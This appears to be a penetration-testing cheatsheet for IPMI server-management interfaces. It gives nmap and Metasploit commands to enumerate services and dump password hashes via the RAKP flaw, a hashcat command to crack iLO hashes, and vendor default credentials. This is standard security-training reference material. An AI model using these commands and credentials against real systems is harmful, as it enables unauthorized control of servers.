# IPMI Cheatsheet

## Enumeration
| Command | Use |
|---------|-----|
| sudo nmap -sU --script ipmi-version -p623 <IP> | Version check |
| msf6 > use auxiliary/scanner/ipmi/ipmi_version | Metasploit version scan |
| msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes | Hash dump (RAKP flaw) |

## Cracking
| Command | Use |
|---------|-----|
| hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u | Crack 8-char hash (iLO default pattern) |

## Default Creds
| Product | User | Pass |
|---------|------|------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | 8-char random (crack it) |
| Supermicro | ADMIN | ADMIN |

## Port
| Port | Service |
|------|---------|
| 623/UDP | IPMI |
